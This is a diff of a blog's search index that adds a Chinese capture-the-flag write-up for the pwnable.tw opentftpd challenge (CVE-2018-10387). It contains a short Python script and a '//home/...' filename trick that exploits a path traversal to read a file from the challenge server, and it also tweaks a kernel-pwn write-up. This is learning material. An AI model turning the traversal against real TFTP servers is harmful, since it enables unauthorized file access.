@@ -3,6 +3,91 @@
   
     
     <entry>
+      <title><![CDATA[pwnable.tw CVE-2018-10387(标题党)]]></title>
+      <url>/2020/01/28/pwnable-tw-CVE-2018-10387-%E6%A0%87%E9%A2%98%E5%85%9A/</url>
+      <content type="html"><![CDATA[<blockquote>
+<p> 参考</p>
+<p> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10387" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10387</a></p>
+<p> patch</p>
+<p> <a href="https://sourceforge.net/p/tftp-server/discussion/550564/thread/a586ce62/" target="_blank" rel="noopener">https://sourceforge.net/p/tftp-server/discussion/550564/thread/a586ce62/</a></p>
+<p> 源码</p>
+<p> <a href="https://zh.osdn.net/projects/sfnet_tftp-server/releases/" target="_blank" rel="noopener">https://zh.osdn.net/projects/sfnet_tftp-server/releases/</a></p>
+</blockquote>
+<a id="more"></a>
+
+<h1 id="闲来无事"><a href="#闲来无事" class="headerlink" title="闲来无事"></a>闲来无事</h1><p>这几天闲来无事，决定刷一刷题，于是就选择了<code>pwnable.tw</code></p>
+<p>赫然发现<code>challange list</code>里面出现了一个CVE，着实提起了我的兴趣，便下载下来分析一番</p>
+<figure class="image-box">
+                <img src="C:\Users\57198\AppData\Roaming\Typora\typora-user-images\image-20200128215335026.png" alt="image-20200128215335026" title class>
+                <p>image-20200128215335026</p>
+            </figure>
+
+<p>乍一看，加粗的<code>remote code execution</code>着实很显眼，明显是在暗示说这一题中具有远程代码执行的漏洞</p>
+<h1 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dajun @ dajun-pc in ~/zoneOfDajun/pwndocker [22:00:15] </span></span><br><span class="line">$ checksec ./opentftpd </span><br><span class="line">[*] <span class="string">'/home/dajun/zoneOfDajun/pwndocker/opentftpd'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<h2 id="google搜索"><a href="#google搜索" class="headerlink" title="google搜索"></a>google搜索</h2><p>循着CVE编号进行了一番查找，找到了发在某个网站的patch</p>
+<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">From 786dbd8e50109a9c183461633ae4b1dffc0233ba Mon Sep 17 00:00:00 2001</span><br><span class="line">From: 0xddaa &lt;0xddaa@gmail.com&gt;</span><br><span class="line">Date: Wed, 25 Apr 2018 10:27:00 +0000</span><br><span class="line">Subject: [PATCH 2/2] Fix heap overflow vulnerabiliy</span><br><span class="line"></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"> opentftpd.cpp | 3 ++-</span><br><span class="line"> 1 file changed, 2 insertions(+), 1 deletion(-)</span><br><span class="line"></span><br><span class="line">diff --git a/opentftpd.cpp b/opentftpd.cpp</span><br><span class="line">index 246f263..4916cb8 100755</span><br><span class="line"><span class="comment">--- a/opentftpd.cpp</span></span><br><span class="line"><span class="comment">+++ b/opentftpd.cpp</span></span><br><span class="line">@@ -267,7 +267,8 @@ int main(int argc, char **argv)</span><br><span class="line"> 							&#125;</span><br><span class="line"> 							else if (ntohs(datain-&gt;opcode) == 5)</span><br><span class="line"> 							&#123;</span><br><span class="line"><span class="deletion">-								sprintf(req1-&gt;serverError.errormessage, "Error %i at Client, %s", ntohs(datain-&gt;block), &amp;datain-&gt;buffer);</span></span><br><span class="line"><span class="addition">+								snprintf(req1-&gt;serverError.errormessage, sizeof(req1-&gt;serverError.errormessage), "Error %i at Client, %s", ntohs(datain-&gt;block), &amp;datain-&gt;buffer);</span></span><br><span class="line"><span class="addition">+								req1-&gt;serverError.errormessage[sizeof(req1-&gt;serverError.errormessage) - 1] = '\0';</span></span><br><span class="line"> 								logMess(req1, 1);</span><br><span class="line"> 								cleanReq(req1);</span><br><span class="line"> 							&#125;</span><br><span class="line"><span class="deletion">-- </span></span><br><span class="line">2.7.4</span><br></pre></td></tr></table></figure>
+
+<p>紧接着我又找到了源代码，之后便是随着代码在分析</p>
+<p>乍一看，这里的patch很明显的告诉我们，<code>sprintf</code>函数因为没有指名长度，导致如果<code>datain-&gt;buffer</code>中的数据长度过长的话，会使<code>req1-&gt;serverError.errormessage</code>溢出，这里似乎是一个漏洞点</p>
+<p>但转念一想，程序开启了<code>canary</code>，所以似乎得先泄露<code>canary</code>？且CVE的描述是<code>heap based</code>，而这只是个栈溢出啊？</p>
+<p>随后经过动态调试后发现，原来在这条patch的上方已经有检测<code>datain-&gt;buffer</code>的长度的代码，这就表示在这里进行溢出是不可能的……</p>
+<p>那这patch到底啥意思……</p>
+<h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><p>直到我于某一刻看见了程序反汇编的这一句代码</p>
+<figure class="image-box">
+                <img src="C:\Users\57198\AppData\Roaming\Typora\typora-user-images\image-20200128220548684.png" alt="image-20200128220548684" title class>
+                <p>image-20200128220548684</p>
+            </figure>
+
+<p>位于<code>processNew</code>函数中，且不管前面是什么意思，程序在按照<code>tftp</code>协议中的<code>get</code>执行的时候，绝对会执行到这里，<code>a1+48</code>是<code>req-&gt;path</code>，其中存储的是即将open的文件的完整路径（当然，这个路径是在<code>tftp Server</code>设置的根路径之下的），<code>a1+312</code>是<code>req-&gt;filename</code>，也就是我们<code>get</code>的文件名</p>
+<p>而我根据源代码进行编译之后，找到的这一处的代码是这样的</p>
+<figure class="image-box">
+                <img src="C:\Users\57198\AppData\Roaming\Typora\typora-user-images\image-20200128221038684.png" alt="image-20200128221038684" title class>
+                <p>image-20200128221038684</p>
+            </figure>
+
+<p>很明显与题目的代码不同</p>
+<p>在这里，<code>a1+48</code>和<code>a1+312</code>和上面的一样，<code>::dest</code>是<code>tftp Server</code>配置文件中所设置的根目录，比如我的根目录设置的是<code>/tmp</code>，那么理论上你<code>get</code>的所有请求只能在<code>/tmp</code>目录之下，且有代码专门检测<code>../</code>这样的不合法操作</p>
+<p>到这里其实漏洞点就很清晰了</p>
+<h1 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h1><p>nc过去之后，得到的是</p>
+<p><code>start challenge on udp port: 61196</code></p>
+<p>这么一句话，其中端口是个随机数</p>
+<p>再加上在<code>processNew</code>这句代码中，有这一句</p>
+<figure class="image-box">
+                <img src="C:\Users\57198\AppData\Roaming\Typora\typora-user-images\image-20200128221515971.png" alt="image-20200128221515971" title class>
+                <p>image-20200128221515971</p>
+            </figure>
+
+<p>意思是如果<code>req-&gt;filename</code>的第一个字母是<code>/</code>，则跳过它</p>
+<p>那么如果我们构造一个类似于<code>//home</code>这样的，跳过之后就得到了<code>/home</code>，经过<code>strcpy</code>之后<code>req-&gt;path</code>就成了<code>/home</code>，我们就实现了目录穿越</p>
+<p>先用连接过去一次，尝试请求flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'chall.pwnable.tw'</span></span><br><span class="line">port = <span class="number">10206</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">io = remote(ip, port)</span><br><span class="line">io.recvuntil(<span class="string">'port: '</span>)</span><br><span class="line">udp_port = int(io.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>))</span><br><span class="line">payload = <span class="string">'\x00\x01flag\x00netascii\x00'</span></span><br><span class="line">s.sendto(payload.encode(<span class="string">'utf-8'</span>), (ip, udp_port))</span><br><span class="line">ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">print(ret)</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python ./tftp.py </span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10206: Done</span><br><span class="line">[DEBUG] Received 0x23 bytes:</span><br><span class="line">    b<span class="string">'start challenge on udp port: 61182\n'</span></span><br><span class="line">b<span class="string">'\x00\x03\x00\x01here is /tmp. flag is under /home/opentftp/flag.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'</span></span><br></pre></td></tr></table></figure>
+
+<p>因此我们只需要请求<code>//home/opentftp/flag</code>就得到了flag</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题真的让我大跌眼镜，感觉这两天的分析完全白干了……</p>
+]]></content>
+      
+        <categories>
+            
+            <category> writeup </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> pwnable.tw </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[pwnable.kr rootkit 未完全解]]></title>
       <url>/2020/01/27/pwnable-kr-rootkit-%E6%9C%AA%E5%AE%8C%E5%85%A8%E8%A7%A3/</url>
       <content type="html"><![CDATA[<p>偏向简单的一题</p>
@@ -262,7 +347,7 @@
 <p>先从bzImage中提取出来vmlinux，然后再把core.cpio解包</p>
 <p><code>-s</code>告诉我们可以用gdb来调试它</p>
 <h1 id="再看init"><a href="#再看init" class="headerlink" title="再看init"></a>再看init</h1><p>进入core.cpio解包的文件夹，查看init</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/sh</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">echo 'sh end!\n'</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">poweroff -d 120 -f &amp;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">echo 'sh end!\n'</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
 
 <p><code>cat /proc/kallsyms &gt; /tmp/kallsyms</code>告诉我们有一个备份的kallsyms</p>
 <p><code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code>告诉我们不能通过 <code>/proc/kallsyms</code> 查看函数地址</p>
